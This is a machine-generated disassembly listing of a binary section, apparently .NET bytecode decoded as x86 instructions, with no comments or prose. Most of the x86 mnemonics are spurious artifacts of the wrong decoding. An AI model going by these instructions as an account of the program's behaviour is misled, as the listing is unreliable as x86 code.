  403b83:	76 00                	jbe    0x403b85
  403b85:	00 0a                	add    %cl,(%edx)
  403b87:	28 4a 00             	sub    %cl,0x0(%edx)
  403b8a:	00 06                	add    %al,(%esi)
  403b8c:	00 00                	add    %al,(%eax)
  403b8e:	de 00                	fiadds (%eax)
  403b90:	38 b0 00 00 00 00    	cmp    %dh,0x0(%eax)
  403b96:	06                   	push   %es
  403b97:	72 bf                	jb     0x403b58
  403b99:	06                   	push   %es
  403b9a:	00 70 6f             	add    %dh,0x6f(%eax)
  403b9d:	4e                   	dec    %esi
  403b9e:	00 00                	add    %al,(%eax)
  403ba0:	0a 6f ba             	or     -0x46(%edi),%ch
  403ba3:	00 00                	add    %al,(%eax)
  403ba5:	0a 06                	or     (%esi),%al
  403ba7:	72 93                	jb     0x403b3c
  403ba9:	06                   	push   %es
  403baa:	00 70 6f             	add    %dh,0x6f(%eax)
  403bad:	4e                   	dec    %esi
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	0a 6f be             	or     -0x42(%edi),%ch
  403bb3:	00 00                	add    %al,(%eax)
  403bb5:	0a 28                	or     (%eax),%ch
  403bb7:	42                   	inc    %edx
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	06                   	push   %es
  403bbb:	26 72 c9             	es jb  0x403b87
  403bbe:	06                   	push   %es
  403bbf:	00 70 28             	add    %dh,0x28(%eax)
  403bc2:	2e 00 00             	add    %al,%cs:(%eax)
  403bc5:	0a 00                	or     (%eax),%al
  403bc7:	00 7e 21             	add    %bh,0x21(%esi)
  403bca:	00 00                	add    %al,(%eax)
  403bcc:	04 28                	add    $0x28,%al
  403bce:	01 00                	add    %eax,(%eax)
  403bd0:	00 2b                	add    %ch,(%ebx)
  403bd2:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd3:	c0 00 00             	rolb   $0x0,(%eax)
  403bd6:	0a 13                	or     (%ebx),%dl
  403bd8:	07                   	pop    %es
  403bd9:	2b 4e 12             	sub    0x12(%esi),%ecx
  403bdc:	07                   	pop    %es
  403bdd:	28 c1                	sub    %al,%cl
  403bdf:	00 00                	add    %al,(%eax)
  403be1:	0a 13                	or     (%ebx),%dl
  403be3:	08 00                	or     %al,(%eax)
  403be5:	11 08                	adc    %ecx,(%eax)
  403be7:	72 93                	jb     0x403b7c
  403be9:	06                   	push   %es
  403bea:	00 70 6f             	add    %dh,0x6f(%eax)
  403bed:	4e                   	dec    %esi
  403bee:	00 00                	add    %al,(%eax)
  403bf0:	0a 6f ba             	or     -0x46(%edi),%ch
  403bf3:	00 00                	add    %al,(%eax)
  403bf5:	0a 06                	or     (%esi),%al
  403bf7:	72 bf                	jb     0x403bb8
  403bf9:	06                   	push   %es
  403bfa:	00 70 6f             	add    %dh,0x6f(%eax)
  403bfd:	4e                   	dec    %esi
  403bfe:	00 00                	add    %al,(%eax)
  403c00:	0a 6f ba             	or     -0x46(%edi),%ch
  403c03:	00 00                	add    %al,(%eax)
  403c05:	0a 28                	or     (%eax),%ch
  403c07:	1f                   	pop    %ds
  403c08:	00 00                	add    %al,(%eax)
  403c0a:	0a 13                	or     (%ebx),%dl
  403c0c:	09 11                	or     %edx,(%ecx)
  403c0e:	09 2c 17             	or     %ebp,(%edi,%edx,1)
  403c11:	00 11                	add    %dl,(%ecx)
  403c13:	08 28                	or     %ch,(%eax)
  403c15:	48                   	dec    %eax
  403c16:	00 00                	add    %al,(%eax)
  403c18:	06                   	push   %es
  403c19:	00 7e 21             	add    %bh,0x21(%esi)
  403c1c:	00 00                	add    %al,(%eax)
  403c1e:	04 11                	add    $0x11,%al
  403c20:	08 6f c2             	or     %ch,-0x3e(%edi)
  403c23:	00 00                	add    %al,(%eax)
  403c25:	0a 26                	or     (%esi),%ah
  403c27:	00 00                	add    %al,(%eax)
  403c29:	12 07                	adc    (%edi),%al
  403c2b:	28 c3                	sub    %al,%bl
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	0a 2d a9 de 0f 12    	or     0x120fdea9,%ch
  403c35:	07                   	pop    %es
  403c36:	fe                   	(bad)
  403c37:	16                   	push   %ss
  403c38:	04 00                	add    $0x0,%al
  403c3a:	00 1b                	add    %bl,(%ebx)
  403c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3d:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403c42:	dc 2b                	fsubrl (%ebx)
  403c44:	00 00                	add    %al,(%eax)
  403c46:	de 13                	ficoms (%ebx)
  403c48:	13 0a                	adc    (%edx),%ecx
  403c4a:	00 11                	add    %dl,(%ecx)
  403c4c:	0a 6f 76             	or     0x76(%edi),%ch
  403c4f:	00 00                	add    %al,(%eax)
  403c51:	0a 28                	or     (%eax),%ch
  403c53:	4a                   	dec    %edx
  403c54:	00 00                	add    %al,(%eax)
  403c56:	06                   	push   %es
  403c57:	00 00                	add    %al,(%eax)
  403c59:	de 00                	fiadds (%eax)
  403c5b:	2a 41 4c             	sub    0x4c(%ecx),%al
  403c5e:	00 00                	add    %al,(%eax)
  403c60:	00 00                	add    %al,(%eax)
  403c62:	00 00                	add    %al,(%eax)
  403c64:	ab                   	stos   %eax,%es:(%edi)
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 86 00 00 00 31    	add    %al,0x31000000(%esi)
  403c6d:	01 00                	add    %eax,(%eax)
  403c6f:	00 13                	add    %dl,(%ebx)
  403c71:	00 00                	add    %al,(%eax)
  403c73:	00 12                	add    %dl,(%edx)
  403c75:	00 00                	add    %al,(%eax)
  403c77:	01 02                	add    %eax,(%edx)
  403c79:	00 00                	add    %al,(%eax)
  403c7b:	00 8d 01 00 00 5b    	add    %cl,0x5b000001(%ebp)
  403c81:	00 00                	add    %al,(%eax)
  403c83:	00 e8                	add    %ch,%al
  403c85:	01 00                	add    %eax,(%eax)
  403c87:	00 0f                	add    %cl,(%edi)
	...
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 01                	add    %al,(%ecx)
  403c95:	00 00                	add    %al,(%eax)
  403c97:	00 fb                	add    %bh,%bl
  403c99:	01 00                	add    %eax,(%eax)
  403c9b:	00 fc                	add    %bh,%ah
  403c9d:	01 00                	add    %eax,(%eax)
  403c9f:	00 13                	add    %dl,(%ebx)
  403ca1:	00 00                	add    %al,(%eax)
  403ca3:	00 12                	add    %dl,(%edx)
  403ca5:	00 00                	add    %al,(%eax)
  403ca7:	01 13                	add    %edx,(%ebx)
  403ca9:	30 0b                	xor    %cl,(%ebx)
  403cab:	00 1a                	add    %bl,(%edx)
  403cad:	01 00                	add    %eax,(%eax)
  403caf:	00 17                	add    %dl,(%edi)
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	11 00                	adc    %eax,(%eax)
  403cb5:	28 c4                	sub    %al,%ah
  403cb7:	00 00                	add    %al,(%eax)
  403cb9:	0a 02                	or     (%edx),%al
  403cbb:	72 93                	jb     0x403c50
  403cbd:	06                   	push   %es
  403cbe:	00 70 6f             	add    %dh,0x6f(%eax)
  403cc1:	4e                   	dec    %esi
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	0a 6f ba             	or     -0x46(%edi),%ch
  403cc7:	00 00                	add    %al,(%eax)
  403cc9:	0a 28                	or     (%eax),%ch
  403ccb:	43                   	inc    %ebx
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	06                   	push   %es
  403ccf:	28 c5                	sub    %al,%ch
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	0a 6f c6             	or     -0x3a(%edi),%ch
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	0a 0a                	or     (%edx),%cl
  403cda:	06                   	push   %es
  403cdb:	72 e3                	jb     0x403cc0
  403cdd:	06                   	push   %es
  403cde:	00 70 6f             	add    %dh,0x6f(%eax)
  403ce1:	c7 00 00 0a 0b 07    	movl   $0x70b0a00,(%eax)
  403ce7:	28 c8                	sub    %cl,%al
  403ce9:	00 00                	add    %al,(%eax)
  403ceb:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  403cee:	2e 00 00             	add    %al,%cs:(%eax)
  403cf1:	04 2c                	add    $0x2c,%al
  403cf3:	05 38 85 00 00       	add    $0x8538,%eax
  403cf8:	00 20                	add    %ah,(%eax)
  403cfa:	00 01                	add    %al,(%ecx)
  403cfc:	00 00                	add    %al,(%eax)
  403cfe:	72 ff                	jb     0x403cff
  403d00:	06                   	push   %es
  403d01:	00 70 14             	add    %dh,0x14(%eax)
  403d04:	d0 0e                	rorb   $1,(%esi)
  403d06:	00 00                	add    %al,(%eax)
  403d08:	02 28                	add    (%eax),%ch
  403d0a:	c9                   	leave
  403d0b:	00 00                	add    %al,(%eax)
  403d0d:	0a 1f                	or     (%edi),%bl
  403d0f:	09 8d 84 00 00 01    	or     %ecx,0x1000084(%ebp)
  403d15:	25 16 16 14 28       	and    $0x28141616,%eax
  403d1a:	ca 00 00             	lret   $0x0
  403d1d:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  403d23:	28 ca                	sub    %cl,%dl
  403d25:	00 00                	add    %al,(%eax)
  403d27:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  403d2d:	28 ca                	sub    %cl,%dl
  403d2f:	00 00                	add    %al,(%eax)
  403d31:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  403d37:	28 ca                	sub    %cl,%dl
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  403d41:	28 ca                	sub    %cl,%dl
  403d43:	00 00                	add    %al,(%eax)
  403d45:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  403d4b:	28 ca                	sub    %cl,%dl
  403d4d:	00 00                	add    %al,(%eax)
  403d4f:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  403d55:	28 ca                	sub    %cl,%dl
  403d57:	00 00                	add    %al,(%eax)
  403d59:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  403d5f:	28 ca                	sub    %cl,%dl
  403d61:	00 00                	add    %al,(%eax)
  403d63:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  403d69:	28 ca                	sub    %cl,%dl
  403d6b:	00 00                	add    %al,(%eax)
  403d6d:	0a a2 28 cb 00 00    	or     0xcb28(%edx),%ah
  403d73:	0a 28                	or     (%eax),%ch
  403d75:	cc                   	int3
  403d76:	00 00                	add    %al,(%eax)
  403d78:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  403d7e:	7e 2e                	jle    0x403dae
  403d80:	00 00                	add    %al,(%eax)
  403d82:	04 7b                	add    $0x7b,%al
  403d84:	cd 00                	int    $0x0
  403d86:	00 0a                	add    %cl,(%edx)
  403d88:	7e 2e                	jle    0x403db8
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	04 08                	add    $0x8,%al
  403d8e:	28 06                	sub    %al,(%esi)
  403d90:	00 00                	add    %al,(%eax)
  403d92:	06                   	push   %es
  403d93:	7e 0b                	jle    0x403da0
  403d95:	00 00                	add    %al,(%eax)
  403d97:	04 7e                	add    $0x7e,%al
  403d99:	10 00                	adc    %al,(%eax)
  403d9b:	00 04 02             	add    %al,(%edx,%eax,1)
  403d9e:	72 07                	jb     0x403da7
  403da0:	07                   	pop    %es
  403da1:	00 70 6f             	add    %dh,0x6f(%eax)
  403da4:	4e                   	dec    %esi
  403da5:	00 00                	add    %al,(%eax)
  403da7:	0a 6f be             	or     -0x42(%edi),%ch
  403daa:	00 00                	add    %al,(%eax)
  403dac:	0a 7e 1f             	or     0x1f(%esi),%bh
  403daf:	00 00                	add    %al,(%eax)
  403db1:	04 7e                	add    $0x7e,%al
  403db3:	08 00                	or     %al,(%eax)
  403db5:	00 04 7e             	add    %al,(%esi,%edi,2)
  403db8:	0f 00 00             	sldt   (%eax)
  403dbb:	04 7e                	add    $0x7e,%al
  403dbd:	04 00                	add    $0x0,%al
  403dbf:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403dc2:	ce                   	into
  403dc3:	00 00                	add    %al,(%eax)
  403dc5:	0a 00                	or     (%eax),%al
  403dc7:	28 49 00             	sub    %cl,0x0(%ecx)
  403dca:	00 06                	add    %al,(%esi)
  403dcc:	00 2a                	add    %ch,(%edx)
  403dce:	00 00                	add    %al,(%eax)
  403dd0:	13 30                	adc    (%eax),%esi
  403dd2:	02 00                	add    (%eax),%al
  403dd4:	35 00 00 00 18       	xor    $0x18000000,%eax
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	11 00                	adc    %eax,(%eax)
  403ddd:	73 4d                	jae    0x403e2c
  403ddf:	00 00                	add    %al,(%eax)
  403de1:	0a 0a                	or     (%edx),%cl
  403de3:	06                   	push   %es
  403de4:	72 d1                	jb     0x403db7
  403de6:	01 00                	add    %eax,(%eax)
  403de8:	70 6f                	jo     0x403e59
  403dea:	4e                   	dec    %esi
  403deb:	00 00                	add    %al,(%eax)
  403ded:	0a 72 17             	or     0x17(%edx),%dh
  403df0:	07                   	pop    %es
  403df1:	00 70 6f             	add    %dh,0x6f(%eax)
  403df4:	4f                   	dec    %edi
  403df5:	00 00                	add    %al,(%eax)
  403df7:	0a 00                	or     (%eax),%al
  403df9:	06                   	push   %es
  403dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  403dfb:	51                   	push   %ecx
  403dfc:	00 00                	add    %al,(%eax)
  403dfe:	0a 28                	or     (%eax),%ch
  403e00:	21 00                	and    %eax,(%eax)
  403e02:	00 06                	add    %al,(%esi)
  403e04:	00 20                	add    %ah,(%eax)
  403e06:	e8 03 00 00 28       	call   0x28403e0e
  403e0b:	10 00                	adc    %al,(%eax)
  403e0d:	00 0a                	add    %cl,(%edx)
  403e0f:	00 2a                	add    %ch,(%edx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 13                	add    %dl,(%ebx)
  403e15:	30 02                	xor    %al,(%edx)
  403e17:	00 3c 00             	add    %bh,(%eax,%eax,1)
  403e1a:	00 00                	add    %al,(%eax)
  403e1c:	18 00                	sbb    %al,(%eax)
  403e1e:	00 11                	add    %dl,(%ecx)
  403e20:	00 73 4d             	add    %dh,0x4d(%ebx)
  403e23:	00 00                	add    %al,(%eax)
  403e25:	0a 0a                	or     (%edx),%cl
  403e27:	06                   	push   %es
  403e28:	72 d1                	jb     0x403dfb
  403e2a:	01 00                	add    %eax,(%eax)
  403e2c:	70 6f                	jo     0x403e9d
  403e2e:	4e                   	dec    %esi
  403e2f:	00 00                	add    %al,(%eax)
  403e31:	0a 72 29             	or     0x29(%edx),%dh
  403e34:	07                   	pop    %es
  403e35:	00 70 6f             	add    %dh,0x6f(%eax)
  403e38:	4f                   	dec    %edi
  403e39:	00 00                	add    %al,(%eax)
  403e3b:	0a 00                	or     (%eax),%al
  403e3d:	06                   	push   %es
  403e3e:	72 29                	jb     0x403e69
  403e40:	07                   	pop    %es
  403e41:	00 70 6f             	add    %dh,0x6f(%eax)
  403e44:	4e                   	dec    %esi
  403e45:	00 00                	add    %al,(%eax)
  403e47:	0a 02                	or     (%edx),%al
  403e49:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4a:	4f                   	dec    %edi
  403e4b:	00 00                	add    %al,(%eax)
  403e4d:	0a 00                	or     (%eax),%al
  403e4f:	06                   	push   %es
  403e50:	6f                   	outsl  %ds:(%esi),(%dx)
  403e51:	51                   	push   %ecx
  403e52:	00 00                	add    %al,(%eax)
  403e54:	0a 28                	or     (%eax),%ch
  403e56:	21 00                	and    %eax,(%eax)
  403e58:	00 06                	add    %al,(%esi)
  403e5a:	00 2a                	add    %ch,(%edx)
  403e5c:	2e 73 cf             	jae,pn 0x403e2e
  403e5f:	00 00                	add    %al,(%eax)
  403e61:	0a 80 21 00 00 04    	or     0x4000021(%eax),%al
  403e67:	2a 1b                	sub    (%ebx),%bl
  403e69:	30 03                	xor    %al,(%ebx)
  403e6b:	00 5a 00             	add    %bl,0x0(%edx)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	19 00                	sbb    %eax,(%eax)
  403e72:	00 11                	add    %dl,(%ecx)
  403e74:	02 28                	add    (%eax),%ch
  403e76:	14 00                	adc    $0x0,%al
  403e78:	00 0a                	add    %cl,(%edx)
  403e7a:	00 00                	add    %al,(%eax)
  403e7c:	03 28                	add    (%eax),%ebp
  403e7e:	d0 00                	rolb   $1,(%eax)
  403e80:	00 0a                	add    %cl,(%edx)
  403e82:	0a 06                	or     (%esi),%al
  403e84:	2c 0b                	sub    $0xb,%al
  403e86:	72 35                	jb     0x403ebd
  403e88:	07                   	pop    %es
  403e89:	00 70 73             	add    %dh,0x73(%eax)
  403e8c:	d1 00                	roll   $1,(%eax)
  403e8e:	00 0a                	add    %cl,(%edx)
  403e90:	7a 03                	jp     0x403e95
  403e92:	7e 28                	jle    0x403ebc
  403e94:	00 00                	add    %al,(%eax)
  403e96:	04 20                	add    $0x20,%al
  403e98:	50                   	push   %eax
  403e99:	c3                   	ret
  403e9a:	00 00                	add    %al,(%eax)
  403e9c:	73 d2                	jae    0x403e70
  403e9e:	00 00                	add    %al,(%eax)
  403ea0:	0a 0b                	or     (%ebx),%cl
  403ea2:	00 02                	add    %al,(%edx)
  403ea4:	07                   	pop    %es
  403ea5:	1f                   	pop    %ds
  403ea6:	20 6f d3             	and    %ch,-0x2d(%edi)
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	0a 7d 26             	or     0x26(%ebp),%bh
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	04 02                	add    $0x2,%al
  403eb2:	07                   	pop    %es
  403eb3:	1f                   	pop    %ds
  403eb4:	40                   	inc    %eax
  403eb5:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb6:	d3 00                	roll   %cl,(%eax)
  403eb8:	00 0a                	add    %cl,(%edx)
  403eba:	7d 27                	jge    0x403ee3
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	04 00                	add    $0x0,%al
  403ec0:	de 0b                	fimuls (%ebx)
  403ec2:	07                   	pop    %es
  403ec3:	2c 07                	sub    $0x7,%al
  403ec5:	07                   	pop    %es
  403ec6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec7:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403ecc:	dc 2a                	fsubrl (%edx)
  403ece:	00 00                	add    %al,(%eax)
  403ed0:	01 10                	add    %edx,(%eax)
  403ed2:	00 00                	add    %al,(%eax)
  403ed4:	02 00                	add    (%eax),%al
  403ed6:	2e 00 20             	add    %ah,%cs:(%eax)
  403ed9:	4e                   	dec    %esi
  403eda:	00 0b                	add    %cl,(%ebx)
  403edc:	00 00                	add    %al,(%eax)
  403ede:	00 00                	add    %al,(%eax)
  403ee0:	13 30                	adc    (%eax),%esi
  403ee2:	03 00                	add    (%eax),%eax
  403ee4:	1c 00                	sbb    $0x0,%al
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	0d 00 00 11 00       	or     $0x110000,%eax
  403eed:	02 28                	add    (%eax),%ch
  403eef:	17                   	pop    %ss
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	0a 03                	or     (%ebx),%al
  403ef4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef5:	18 00                	sbb    %al,(%eax)
  403ef7:	00 0a                	add    %cl,(%edx)
  403ef9:	28 4e 00             	sub    %cl,0x0(%esi)
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 d4                	sub    %dl,%ah
  403f00:	00 00                	add    %al,(%eax)
  403f02:	0a 0a                	or     (%edx),%cl
  403f04:	2b 00                	sub    (%eax),%eax
  403f06:	06                   	push   %es
  403f07:	2a 1b                	sub    (%ebx),%bl
  403f09:	30 05 00 25 01 00    	xor    %al,0x12500
  403f0f:	00 1a                	add    %bl,(%edx)
  403f11:	00 00                	add    %al,(%eax)
  403f13:	11 00                	adc    %eax,(%eax)
  403f15:	03 14 fe             	add    (%esi,%edi,8),%edx
  403f18:	01 0a                	add    %ecx,(%edx)
  403f1a:	06                   	push   %es
  403f1b:	2c 0b                	sub    $0xb,%al
  403f1d:	72 7d                	jb     0x403f9c
  403f1f:	07                   	pop    %es
  403f20:	00 70 73             	add    %dh,0x73(%eax)
  403f23:	d5 00                	aad    $0x0
  403f25:	00 0a                	add    %cl,(%edx)
  403f27:	7a 73                	jp     0x403f9c
  403f29:	d6                   	salc
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	0a 0b                	or     (%ebx),%cl
  403f2e:	00 07                	add    %al,(%edi)
  403f30:	1f                   	pop    %ds
  403f31:	20 6a 6f             	and    %ch,0x6f(%edx)
  403f34:	4a                   	dec    %edx
  403f35:	00 00                	add    %al,(%eax)
  403f37:	0a 00                	or     (%eax),%al
  403f39:	73 d7                	jae    0x403f12
  403f3b:	00 00                	add    %al,(%eax)
  403f3d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403f40:	08 20                	or     %ah,(%eax)
  403f42:	00 01                	add    %al,(%ecx)
  403f44:	00 00                	add    %al,(%eax)
  403f46:	6f                   	outsl  %ds:(%esi),(%dx)
  403f47:	d8 00                	fadds  (%eax)
  403f49:	00 0a                	add    %cl,(%edx)
  403f4b:	00 08                	add    %cl,(%eax)
  403f4d:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  403f53:	d9 00                	flds   (%eax)
  403f55:	00 0a                	add    %cl,(%edx)
  403f57:	00 08                	add    %cl,(%eax)
  403f59:	17                   	pop    %ss
  403f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f5b:	da 00                	fiaddl (%eax)
  403f5d:	00 0a                	add    %cl,(%edx)
  403f5f:	00 08                	add    %cl,(%eax)
  403f61:	18 6f db             	sbb    %ch,-0x25(%edi)
  403f64:	00 00                	add    %al,(%eax)
  403f66:	0a 00                	or     (%eax),%al
  403f68:	08 02                	or     %al,(%edx)
  403f6a:	7b 26                	jnp    0x403f92
  403f6c:	00 00                	add    %al,(%eax)
  403f6e:	04 6f                	add    $0x6f,%al
  403f70:	dc 00                	faddl  (%eax)
  403f72:	00 0a                	add    %cl,(%edx)
  403f74:	00 08                	add    %cl,(%eax)
  403f76:	6f                   	outsl  %ds:(%esi),(%dx)
  403f77:	dd 00                	fldl   (%eax)
  403f79:	00 0a                	add    %cl,(%edx)
  403f7b:	00 07                	add    %al,(%edi)
  403f7d:	08 6f de             	or     %ch,-0x22(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 17                	or     (%edi),%dl
  403f84:	73 df                	jae    0x403f65
  403f86:	00 00                	add    %al,(%eax)
  403f88:	0a 0d 00 07 08 6f    	or     0x6f080700,%cl
  403f8e:	e0 00                	loopne 0x403f90
  403f90:	00 0a                	add    %cl,(%edx)
  403f92:	16                   	push   %ss
  403f93:	08 6f e0             	or     %ch,-0x20(%edi)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 8e 69 6f 48 00    	or     0x486f69(%esi),%cl
  403f9e:	00 0a                	add    %cl,(%edx)
  403fa0:	00 09                	add    %cl,(%ecx)
  403fa2:	03 16                	add    (%esi),%edx
  403fa4:	03 8e 69 6f 48 00    	add    0x486f69(%esi),%ecx
  403faa:	00 0a                	add    %cl,(%edx)
  403fac:	00 09                	add    %cl,(%ecx)
  403fae:	6f                   	outsl  %ds:(%esi),(%dx)
  403faf:	e1 00                	loope  0x403fb1
  403fb1:	00 0a                	add    %cl,(%edx)
  403fb3:	00 02                	add    %al,(%edx)
  403fb5:	7b 27                	jnp    0x403fde
  403fb7:	00 00                	add    %al,(%eax)
  403fb9:	04 73                	add    $0x73,%al
  403fbb:	e2 00                	loop   0x403fbd
  403fbd:	00 0a                	add    %cl,(%edx)
  403fbf:	13 04 00             	adc    (%eax,%eax,1),%eax
  403fc2:	11 04 07             	adc    %eax,(%edi,%eax,1)
  403fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc6:	e3 00                	jecxz  0x403fc8
  403fc8:	00 0a                	add    %cl,(%edx)
  403fca:	1f                   	pop    %ds
  403fcb:	20 07                	and    %al,(%edi)
  403fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  403fce:	e3 00                	jecxz  0x403fd0
  403fd0:	00 0a                	add    %cl,(%edx)
  403fd2:	8e 69 1f             	mov    0x1f(%ecx),%gs
  403fd5:	20 59 6f             	and    %bl,0x6f(%ecx)
  403fd8:	e4 00                	in     $0x0,%al
  403fda:	00 0a                	add    %cl,(%edx)
  403fdc:	13 05 07 16 6a 6f    	adc    0x6f6a1607,%eax
  403fe2:	4a                   	dec    %edx
  403fe3:	00 00                	add    %al,(%eax)
  403fe5:	0a 00                	or     (%eax),%al
  403fe7:	07                   	pop    %es
  403fe8:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  403fee:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  403ff5:	00 de                	add    %bl,%dh
  403ff7:	0d 11 04 2c 08       	or     $0x82c0411,%eax
  403ffc:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403fff:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404004:	dc 00                	faddl  (%eax)
  404006:	de 0b                	fimuls (%ebx)
  404008:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  40400b:	09 6f 2d             	or     %ebp,0x2d(%edi)
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 00                	or     (%eax),%al
  404012:	dc 00                	faddl  (%eax)
  404014:	de 0b                	fimuls (%ebx)
  404016:	08 2c 07             	or     %ch,(%edi,%eax,1)
  404019:	08 6f 2d             	or     %ch,0x2d(%edi)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	0a 00                	or     (%eax),%al
  404020:	dc 07                	faddl  (%edi)
  404022:	6f                   	outsl  %ds:(%esi),(%dx)
  404023:	e3 00                	jecxz  0x404025
  404025:	00 0a                	add    %cl,(%edx)
  404027:	13 06                	adc    (%esi),%eax
  404029:	de 0b                	fimuls (%ebx)
  40402b:	07                   	pop    %es
  40402c:	2c 07                	sub    $0x7,%al
  40402e:	07                   	pop    %es
  40402f:	6f                   	outsl  %ds:(%esi),(%dx)
  404030:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404035:	dc 11                	fcoml  (%ecx)
  404037:	06                   	push   %es
  404038:	2a 00                	sub    (%eax),%al
  40403a:	00 00                	add    %al,(%eax)
  40403c:	01 34 00             	add    %esi,(%eax,%eax,1)
  40403f:	00 02                	add    %al,(%edx)
  404041:	00 ad 00 37 e4 00    	add    %ch,0xe43700(%ebp)
  404047:	0d 00 00 00 00       	or     $0x0,%eax
  40404c:	02 00                	add    (%eax),%al
  40404e:	76 00                	jbe    0x404050
  404050:	7e f4                	jle    0x404046
  404052:	00 0b                	add    %cl,(%ebx)
  404054:	00 00                	add    %al,(%eax)
  404056:	00 00                	add    %al,(%eax)
  404058:	02 00                	add    (%eax),%al
  40405a:	2b 00                	sub    (%eax),%eax
  40405c:	d7                   	xlat   %ds:(%ebx)
  40405d:	02 01                	add    (%ecx),%al
  40405f:	0b 00                	or     (%eax),%eax
  404061:	00 00                	add    %al,(%eax)
  404063:	00 02                	add    %al,(%edx)
  404065:	00 1a                	add    %bl,(%edx)
  404067:	00 fd                	add    %bh,%ch
  404069:	17                   	pop    %ss
  40406a:	01 0b                	add    %ecx,(%ebx)
  40406c:	00 00                	add    %al,(%eax)
  40406e:	00 00                	add    %al,(%eax)
  404070:	13 30                	adc    (%eax),%esi
  404072:	03 00                	add    (%eax),%eax
  404074:	1c 00                	sbb    $0x0,%al
  404076:	00 00                	add    %al,(%eax)
  404078:	0d 00 00 11 00       	or     $0x110000,%eax
  40407d:	28 17                	sub    %dl,(%edi)
  40407f:	00 00                	add    %al,(%eax)
  404081:	0a 02                	or     (%edx),%al
  404083:	03 28                	add    (%eax),%ebp
  404085:	1a 00                	sbb    (%eax),%al
  404087:	00 0a                	add    %cl,(%edx)
  404089:	28 50 00             	sub    %dl,0x0(%eax)
  40408c:	00 06                	add    %al,(%esi)
  40408e:	6f                   	outsl  %ds:(%esi),(%dx)
  40408f:	e5 00                	in     $0x0,%eax
  404091:	00 0a                	add    %cl,(%edx)
  404093:	0a 2b                	or     (%ebx),%ch
  404095:	00 06                	add    %al,(%esi)
  404097:	2a 1b                	sub    (%ebx),%bl
  404099:	30 05 00 58 01 00    	xor    %al,0x15800
  40409f:	00 1b                	add    %bl,(%ebx)
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	11 00                	adc    %eax,(%eax)
  4040a5:	03 14 fe             	add    (%esi,%edi,8),%edx
  4040a8:	01 0a                	add    %ecx,(%edx)
  4040aa:	06                   	push   %es
  4040ab:	2c 0b                	sub    $0xb,%al
  4040ad:	72 7d                	jb     0x40412c
  4040af:	07                   	pop    %es
  4040b0:	00 70 73             	add    %dh,0x73(%eax)
  4040b3:	d5 00                	aad    $0x0
  4040b5:	00 0a                	add    %cl,(%edx)
  4040b7:	7a 03                	jp     0x4040bc
  4040b9:	73 49                	jae    0x404104
  4040bb:	00 00                	add    %al,(%eax)
  4040bd:	0a 0b                	or     (%ebx),%cl
  4040bf:	00 73 d7             	add    %dh,-0x29(%ebx)
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4040c7:	08 20                	or     %ah,(%eax)
  4040c9:	00 01                	add    %al,(%ecx)
  4040cb:	00 00                	add    %al,(%eax)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	d8 00                	fadds  (%eax)
  4040d0:	00 0a                	add    %cl,(%edx)
  4040d2:	00 08                	add    %cl,(%eax)
  4040d4:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4040da:	d9 00                	flds   (%eax)
  4040dc:	00 0a                	add    %cl,(%edx)
  4040de:	00 08                	add    %cl,(%eax)
  4040e0:	17                   	pop    %ss
